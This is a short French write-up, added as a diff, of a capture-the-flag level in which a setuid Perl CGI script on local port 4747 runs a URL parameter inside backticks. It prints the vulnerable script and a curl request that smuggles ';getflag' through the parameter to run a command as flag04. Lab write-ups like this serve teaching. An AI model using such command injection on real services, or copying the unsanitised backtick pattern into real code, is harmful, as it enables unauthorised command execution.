@@ -1,0 +1,24 @@
+On a un fichier perl avec le bit suid actif et en user flag04
+On cherche donc a exploiter une faille du script pour executer getflag en tant que flag04
+en affichant le script, on voit cela:
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+le script ecoute donc sur le port local 4747, recupere dans les requete le parametre x grace a la cgi 
+et execute x() qui set y au premier parametre, donc celui passer dans l'url.
+
+De plus, en perl, les `` executent la commande a l'interieur,
+Donc print `echo $y 2>&1` execute echo $y 2>&1 puis print le resultat
+
+On peut donc faire: 
+curl "http://localhost:4747/level04.pl?x=hello%3Bgetflag"
+
+Cela execute echo hello;getflag en tant que flag04 (%3B = ; (doit etre encode dans l'url))
